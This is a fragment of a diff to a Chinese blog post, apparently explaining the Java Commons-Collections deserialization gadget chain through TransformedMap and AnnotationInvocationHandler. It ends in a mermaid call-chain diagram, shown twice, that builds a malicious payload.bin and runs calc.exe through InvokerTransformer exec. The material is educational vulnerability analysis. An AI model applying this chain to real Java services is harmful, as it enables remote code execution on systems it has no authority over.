+                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(
+                                annotationType.members().get(name)));
+                &#125;
+            &#125;
+        &#125;
+    &#125;</code></pre>
 <p>其中有： <code>Class&lt;?&gt; memberType = memberTypes.get(name);</code><br><code>memberTypes</code>的默认的是 {value：ElementType} 的键值对，如果<code>memberValues</code>传递进来的键不是value（<code>innerMap.put(&quot;value&quot;, &quot;test&quot;);</code>），那么在执行get()方法时就获取不到对应键为的value的值，if语句就不成立，故而不能执行setValue() 方法触发漏洞。</p>
 <p>最终构造类：<a href="#1"  style="text-decoration:underline;" >Serialize_Test_Poc</a>。<br>执行效果如下：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210329104220805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="三、调用链总结"><a href="#三、调用链总结" class="headerlink" title="三、调用链总结"></a>三、调用链总结</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;触发之后产生返回值，返回到最终执行命令calc.exe</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">graph TB</span><br><span class="line">A[开始] --&gt;B(&quot;Object runtime&quot;)</span><br><span class="line">    B  -- 反射调用 --&gt; C(&quot;InvokerTransformer(&#x27;exec&#x27;,String.class,&#x27;calc.exe&#x27;).transform(runtime)&quot;)</span><br><span class="line">    C--接口回调--&gt;D(&quot;Transformer.transform()&quot;)</span><br><span class="line">    e1--返回--&gt;D(&quot;Transformer.transform()&quot;)</span><br><span class="line">    A6--触发--&gt;F0(&quot;(Map) outerMap&quot;)</span><br><span class="line">    F0--返回--&gt;F(&quot;(Map) decorate()&quot;)</span><br><span class="line">    F--返回--&gt;E(&quot;TransformedMap&quot;)</span><br><span class="line">   E--返回--&gt;e1(&quot;TransformedMap.decorate()&quot;)</span><br><span class="line">    D --接口回调--&gt; e1(&quot;TransformedMap.decorate()&quot;)</span><br><span class="line">    D --接口回调--&gt; e2(&quot;TransformedMap.checkSetValue()&quot;)</span><br><span class="line">    e1--调用构造函数生成实例对象--&gt;E(&quot;TransformedMap&quot;)</span><br><span class="line">    E--接口回调--&gt; F(&quot;(Map) decorate()&quot;)</span><br><span class="line">    F--生成--&gt;F0(&quot;(Map) outerMap&quot;)</span><br><span class="line">    e2 --返回调用transform结果--&gt; G(&quot;(Map) checkSetValue()&quot;)</span><br><span class="line">    G--Java的继承和向上转型--&gt; A1(&quot;(Map.Entry) setValue()&quot;)</span><br><span class="line">    A1--Java反射--&gt; A2(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)</span><br><span class="line">    A2--实例化对象--&gt; A3(&quot;(Object)  ctor.newInstance(Target.class, outerMap)&quot;)</span><br><span class="line">    A3--生成对象--&gt; A4(&quot;(AnnotationInvocationHandler)  instance&quot;)</span><br><span class="line">    A4--序列化对象instance生成恶意payload--&gt;A5(&quot;payload.bin&quot;)</span><br><span class="line">    A5--恶意序列化文件输入--&gt;A6(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject()&quot;)</span><br><span class="line">    A5--接口回调调用重写的AnnotationInvocationHandler.readObject--&gt;A6(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject()&quot;)</span><br><span class="line">    A6--触发--&gt;A7(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject().setValue()&quot;)</span><br><span class="line">    A7--返回--&gt;A1(&quot;(Map.Entry) setValue()&quot;)</span><br><span class="line">A1--返回--&gt;G(&quot;(Map) checkSetValue()&quot;)</span><br><span class="line">G(&quot;(Map) checkSetValue()&quot;)--返回--&gt;e2(&quot;TransformedMap.checkSetValue()&quot;)</span><br><span class="line">e2--返回--&gt;D(&quot;Transformer.transform()&quot;)</span><br><span class="line">D--返回--&gt;C(&quot;InvokerTransformer(&#x27;exec&#x27;,String.class,&#x27;calc.exe&#x27;).transform(runtime)&quot;)</span><br><span class="line">C--返回--&gt;B(&quot;Object runtime&quot;)</span><br><span class="line">B--执行命令calc.exe--&gt;N[结束]</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mermaid">graph TB
+A[开始] --&gt;B(&quot;Object runtime&quot;)
+    B  -- 反射调用 --&gt; C(&quot;InvokerTransformer(&#x27;exec&#x27;,String.class,&#x27;calc.exe&#x27;).transform(runtime)&quot;)
+    C--接口回调--&gt;D(&quot;Transformer.transform()&quot;)
+    e1--返回--&gt;D(&quot;Transformer.transform()&quot;)
+    A6--触发--&gt;F0(&quot;(Map) outerMap&quot;)
+    F0--返回--&gt;F(&quot;(Map) decorate()&quot;)
+    F--返回--&gt;E(&quot;TransformedMap&quot;)
+   E--返回--&gt;e1(&quot;TransformedMap.decorate()&quot;)
+    D --接口回调--&gt; e1(&quot;TransformedMap.decorate()&quot;)
+    D --接口回调--&gt; e2(&quot;TransformedMap.checkSetValue()&quot;)
+    e1--调用构造函数生成实例对象--&gt;E(&quot;TransformedMap&quot;)
+    E--接口回调--&gt; F(&quot;(Map) decorate()&quot;)
+    F--生成--&gt;F0(&quot;(Map) outerMap&quot;)
+    e2 --返回调用transform结果--&gt; G(&quot;(Map) checkSetValue()&quot;)
+    G--Java的继承和向上转型--&gt; A1(&quot;(Map.Entry) setValue()&quot;)
+    A1--Java反射--&gt; A2(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+    A2--实例化对象--&gt; A3(&quot;(Object)  ctor.newInstance(Target.class, outerMap)&quot;)
+    A3--生成对象--&gt; A4(&quot;(AnnotationInvocationHandler)  instance&quot;)
+    A4--序列化对象instance生成恶意payload--&gt;A5(&quot;payload.bin&quot;)
+    A5--恶意序列化文件输入--&gt;A6(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject()&quot;)
+    A5--接口回调调用重写的AnnotationInvocationHandler.readObject--&gt;A6(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject()&quot;)
+    A6--触发--&gt;A7(&quot;sun.reflect.annotation.AnnotationInvocationHandler.readObject().setValue()&quot;)
+    A7--返回--&gt;A1(&quot;(Map.Entry) setValue()&quot;)
+A1--返回--&gt;G(&quot;(Map) checkSetValue()&quot;)
+G(&quot;(Map) checkSetValue()&quot;)--返回--&gt;e2(&quot;TransformedMap.checkSetValue()&quot;)
+e2--返回--&gt;D(&quot;Transformer.transform()&quot;)
+D--返回--&gt;C(&quot;InvokerTransformer(&#x27;exec&#x27;,String.class,&#x27;calc.exe&#x27;).transform(runtime)&quot;)
+C--返回--&gt;B(&quot;Object runtime&quot;)
+B--执行命令calc.exe--&gt;N[结束]</code></pre>
 
         </div>
 
